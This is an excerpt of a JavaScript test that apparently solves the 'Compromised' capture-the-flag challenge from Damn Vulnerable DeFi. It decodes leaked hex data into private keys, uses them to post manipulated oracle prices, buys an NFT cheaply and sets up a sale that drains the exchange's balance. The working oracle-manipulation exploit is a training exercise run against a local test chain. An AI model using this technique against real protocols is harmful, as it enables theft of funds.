...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        const leakToPrivateKey = (leak) => {
            // 1. simply decode the hex string, can be done by using any online decoder
            const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`)
            // 2. now its alphabet and length (divisible by 4) resembles base64 encoding, let's try base64 decode
        ...
        for (let i = 0; i < leakInfo.length; i++) {
            leakWallet = new ethers.Wallet(leakToPrivateKey(leakInfo[i]), ethers.provider);
            await oracle.connect(leakWallet).postPrice(nftToken.symbol(), 0);
        }
        console.log(await oracle.getAllPricesForSymbol('DVNFT'));

        // buy 1
        id = await exchange.connect(player).buyOne({ value: 1n });

        // set price to be the exchange's balance
        for (let i = 0; i < leakInfo.length; i++) {
            leakWallet = new ethers.Wallet(leakToPrivateKey(leakInfo[i]), ethers.provider);
            await oracle.connect(leakWallet).postPrice(nftToken.symbol(), await ethers.provider.getBalance(exchange.address));
        }

        // sell to drain exchange's balace
